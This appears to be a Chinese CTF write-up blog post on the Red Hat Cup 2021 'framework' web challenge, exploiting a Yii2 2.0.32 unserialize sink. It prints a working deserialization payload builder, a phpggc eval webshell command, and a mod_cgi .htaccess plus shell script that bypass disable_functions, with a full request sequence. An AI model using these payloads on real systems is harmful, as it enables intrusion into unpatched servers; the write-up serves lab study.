---
title: "CTF Web 进阶三题（一）—— Yii2 反序列化：红帽杯 2021 framework"
date: "2026-10-25"
tags: ["Security", "CTF", "Web"]
excerpt: "Yii 2.0.32 的 about 入口直接 unserialize，用 phpggc 的 Yii2/RCE2 链拿到 eval；再靠 session 激活时机和 mod_cgi 绕过 disable_functions 读 /flag。"
series: "ctf-web-advanced"
seriesOrder: 1
---

> 题目：CTFHub 历年真题 · 2021 第四届红帽杯网络安全大赛 · Web · framework
> 环境：Yii 2.0.32 / PHP 7.4.5 / Apache + mod_php
> 考点：CVE-2020-15148 反序列化链、`phpggc`、session 时机、mod_cgi 绕过 disable_functions

---

## 一、题目长什么样

附件是一个完整的 Yii2 应用（`1166_5dac...zip`），解压后是标准的 `basic` 模板：

```
config/web.php
controllers/SiteController.php
models/User.php
views/site/about.php
web/index.php
vendor/yiisoft/yii2/        # 2.0.32
```

`web/index.php` 里有两行值得注意：

```php
defined('YII_DEBUG') or define('YII_DEBUG', true);
defined('YII_ENV') or define('YII_ENV', 'dev');
system('watch chmod -R +x *');   // 出题人留的，和解题关系不大
```

`config/web.php` 里 `debug` 和 `gii` 两个模块在 dev 下是开的，`cookieValidationKey => 'asdasd'`。

## 二、入口：about 里的 unserialize

`controllers/SiteController.php`：

```php
public function actionAbout($message = 'Hello')
{
    if (Yii::$app->request->isPost) {
        // ...
    }
    $data = base64_decode($message);
    unserialize($data);          // ← line 114，sink 在这里
    return $this->render('about', ['message' => $message]);
}
```

`$message` 来自请求参数，`base64_decode` 后直接 `unserialize`，没有任何限制。

**分诊结论**：有源码 + 有 `unserialize` + 框架版本 2.0.32 → 先查这个版本的已知反序列化链，不要手搓。

## 三、CVE-2020-15148

Yii2 `< 2.0.38` 的已知反序列化漏洞。官方通告的说法是「`BatchQueryResult` 的 `__destruct` 会调用外部传入对象的 `close()`」，配合 `DbSession` / `IndexAction` 等类可以拼出 RCE。

`phpggc` 里对应两条链：

| 链 | 原语 | 用到的回调 |
|---|---|---|
| `Yii2/RCE1` | 调用**一个函数** | `IndexAction::run()` → `call_user_func($checkAccess, $id)` |
| `Yii2/RCE2` | **任意 PHP 代码** | `ExpressionDependency::evaluateDependency()` → `eval()` |

能做 RCE2 就一定要用 RCE2：RCE1 只能调一个函数，遇到 `disable_functions` 很容易卡死（这题就是）。

## 四、链条拆解（RCE2）

用 Yii 2.0.32 的源码逐行看（路径相对 `vendor/yiisoft/yii2/`）：

```
BatchQueryResult::__destruct()                 db/BatchQueryResult.php:79
  └─ reset()                                   db/BatchQueryResult.php:89
       └─ $this->_dataReader->close()          db/BatchQueryResult.php:92

yii\web\DbSession::close()                     web/DbSession.php:149
  ├─ if ($this->getIsActive())                 web/Session.php:220
  └─ $this->fields = $this->composeFields()    web/DbSession.php:153
       └─ call_user_func($this->writeCallback, $this)
                                               web/MultiFieldSession.php:98

[yii\caching\ExpressionDependency, 'evaluateDependency']
  └─ evaluateDependency()                      caching/Dependency.php:47
       └─ generateDependencyData()             caching/ExpressionDependency.php:46
            └─ eval("return {$this->expression};")
```

关键源码（照抄，方便以后对照）：

```php
// db/BatchQueryResult.php:89
public function reset()
{
    if ($this->_dataReader !== null) {
        $this->_dataReader->close();
    }
    ...
}

// web/DbSession.php:149
public function close()
{
    if ($this->getIsActive()) {
        // prepare writeCallback fields before session closes
        $this->fields = $this->composeFields();
        YII_DEBUG ? session_write_close() : @session_write_close();
    }
}

// web/MultiFieldSession.php:96
protected function composeFields($id = null, $data = null)
{
    $fields = $this->writeCallback ? call_user_func($this->writeCallback, $this) : [];
    ...
}

// caching/ExpressionDependency.php:46
protected function generateDependencyData($cache)
{
    return eval("return {$this->expression};");
}
```

## 五、为什么 GET 打不通：session 必须已激活

这是这题最坑的地方，也是 wp 里没写的。

`DbSession::close()` 第一行是 `if ($this->getIsActive())`，而 `getIsActive()` 不是读对象自己的属性：

```php
// web/Session.php:220
public function getIsActive()
{
    return session_status() === PHP_SESSION_ACTIVE;
}
```

它看的是**当前 PHP 进程的全局 session 状态**。

- 直接 GET `?r=site/about&message=...`：没有 `session_start()`，`session_status()` 是 `PHP_SESSION_NONE` → `close()` 直接返回，链子**静默失效**，页面看起来完全正常。
- POST 且带 `_csrf`：Yii 的 CSRF 校验会调用 `$this->getCsrfToken()`，进而 `Yii::$app->session->open()` → session 激活 → 链子才跑。

所以 payload 必须走 **POST + 合法 `_csrf`**。

实测对比：

| 请求方式 | 结果 |
|---|---|
| GET + payload | 200，页面正常，无任何执行 |
| POST 无 `_csrf` | 400 `Unable to verify your data submission` |
| POST + `_csrf` | eval 执行 |

## 六、手工构造 vs phpggc

### 6.1 手工序列化（理解用）

Windows 上没有 PHP 时，可以直接用 Python 拼：

```python
def s(v):  # PHP serialize 字符串
    return 's:%d:"%s";' % (len(v.encode('latin-1')), v)

# 私有属性 _dataReader：键名是 \0类名\0属性名
private = '\x00yii\\db\\BatchQueryResult\x00_dataReader'   # 长度 36

dep = 'O:32:"yii\\caching\\ExpressionDependency":1:{' + s('expression') + s('eval($_REQUEST["ant"]);') + '}'
db  = 'O:17:"yii\\web\\DbSession":1:{' + s('writeCallback') + 'a:2:{i:0;' + dep + 'i:1;' + s('evaluateDependency') + '}}'
payload = 'O:23:"yii\\db\\BatchQueryResult":1:{' + s(private) + db + '}'
```

坑：

- **类名长度必须精确**：`yii\web\DbSession` 是 **17** 字节（`yii`3 + `\`1 + `web`3 + `\`1 + `DbSession`9）。写成 18 会报 `unserialize(): Error at offset 102 of 235 bytes`。
- 私有属性键名带 `\0`，长度 = 1 + 类名长 + 1 + 属性长。
- 手工拼只能拼静态结构，参数一多变就难受。

### 6.2 phpggc（生产用）

```powershell
$php = 'E:\CTF-Labs\.vendor\php\php.exe'
$gg  = 'E:\CTF-Labs\.vendor\phpggc\phpggc'

& $php $gg Yii2/RCE2 'eval($_REQUEST["ant"]);' -b
# TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJc...
```

输出直接 base64，和 wp 里那条一模一样。**这题如果有 phpggc，第一步就结束了**，不需要读一遍 vendor。

## 七、从 eval 到 flag

拿到 eval 之后，按环境一步步来：

### 7.1 先看环境

```php
echo $_SERVER['DOCUMENT_ROOT'];   // /var/www/html/web   ← 不是 /var/www/html
echo $_SERVER['SCRIPT_FILENAME']; // /var/www/html/web/index.php
```

### 7.2 反射查看被禁函数

`disable_functions` 里包含：

```
pcntl_*, exec, shell_exec, popen, proc_open, passthru, symlink, link,
syslog, imap_open, dl, mail, system, putenv
```

`system` 被禁，但 `readfile` / `file_get_contents` / `file_put_contents` 还能用 → 先当文件读取用。

### 7.3 flag 在哪

```php
stat('/flag');        // mode=100600 uid=0 gid=0 size=33
readfile('/flag');    // Permission denied
```

`/flag` 是 `0600 root`，PHP 跑在 **www-data (uid 33)**，读不了。

根目录里还有个 `/readflag`：

```bash
#!/bin/bash
/usr/bin/tac /flag
```

它本身是 `0755`（**没有 setuid**），但 `tac` 带特权（setuid 或 file capability）。所以：

- `cat /flag`（www-data）→ 空
- `/readflag` → 出 flag

### 7.4 用 mod_cgi 把命令跑起来

PHP 里 exec 系全禁，但 Apache 的 CGI 不受 PHP 的 `disable_functions` 约束：

1. 确认 docroot：`/var/www/html/web`
2. 在该目录下建子目录，写 `.htaccess`：

```apache
Options +ExecCGI
AddHandler cgi-script .sh
```

3. 写脚本 `pwn.sh`：

```sh
#!/bin/sh
echo Content-Type: text/plain
echo
id
/readflag
```

4. `chmod 0755`
5. 请求 `http://target/pwn/pwn.sh`

返回：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ctfhub{5143a344f0677f681e84d1ce}
```

注意：CGI 以 **www-data** 运行，`id` 也是 www-data，但 `/readflag` 能出 flag——因为真正提权的是它调用的 `tac`。

## 八、踩过的坑（按时间顺序）

| # | 现象 | 原因 | 解决 |
|---|---|---|---|
| 1 | GET 发 payload 完全没反应 | session 未激活，`getIsActive()` 为 false | 改 POST + `_csrf` |
| 2 | `Error at offset 102 of 235 bytes` | `DbSession` 类名长度写成 18 | 改成 17 |
| 3 | payload 里的 message 没生效 | POST body 覆盖了 query 参数 | payload 放 query，body 只放 `_csrf` |
| 4 | eval 执行了但页面没输出 | `prepareDataProvider()` 抛异常，Yii 错误页清空输出缓冲 | 给 `prepareDataProvider` 塞 `var_dump` 兜底（RCE1 链需要；RCE2 不经过这里） |
| 5 | `system()` 报 disabled | `disable_functions` | 换 `readfile` / `eval` |
| 6 | 写 webshell 后请求返回首页 | DocumentRoot 是 `/var/www/html/web` | 按 `$_SERVER['DOCUMENT_ROOT']` 写 |
| 7 | `readfile('/flag')` Permission denied | `/flag` 是 0600 root | 走 `/readflag` + mod_cgi |
| 8 | `cat /flag` 在 CGI 里输出空 | `cat` 没有特权 | 用 `/readflag`（内部是 setuid 的 `tac`） |

## 九、完整操作序列

```
1. phpggc Yii2/RCE2 'eval($_REQUEST["ant"]);' -b
2. POST /?r=site/about&message=<b64>&ant=phpinfo();
   body: _csrf=<token>
3. ant=echo $_SERVER['DOCUMENT_ROOT'];
4. ant=file_put_contents("/var/www/html/web/pwn/.htaccess", base64_decode("..."));
   ant=file_put_contents("/var/www/html/web/pwn/pwn.sh", base64_decode("..."));
   ant=chmod("/var/www/html/web/pwn/pwn.sh",0755);
5. GET /pwn/pwn.sh  → flag
```

## 十、检查清单（下次遇到框架反序列化）

1. 框架 + 版本 → 先查 CVE / `phpggc -l`
2. 有没有 `__destruct` / `__wakeup` 入口？
3. 链条里有没有「必须先满足的运行状态」？（这题是 session 必须激活）
4. 输出被不被框架吞？（错误页、缓冲区）
5. 拿到 eval 后：docroot？disable_functions？flag 权限？
6. flag 读不到 → `/readflag`、setuid、mod_cgi

## 相关

- 题目 wp：<https://writeup.ctfhub.com/Challenge/2021/第四届红帽杯网络安全大赛/Web/gCHKNAHmSZYT4rrGkqiD9Z.html>
- phpggc：<https://github.com/ambionics/phpggc>
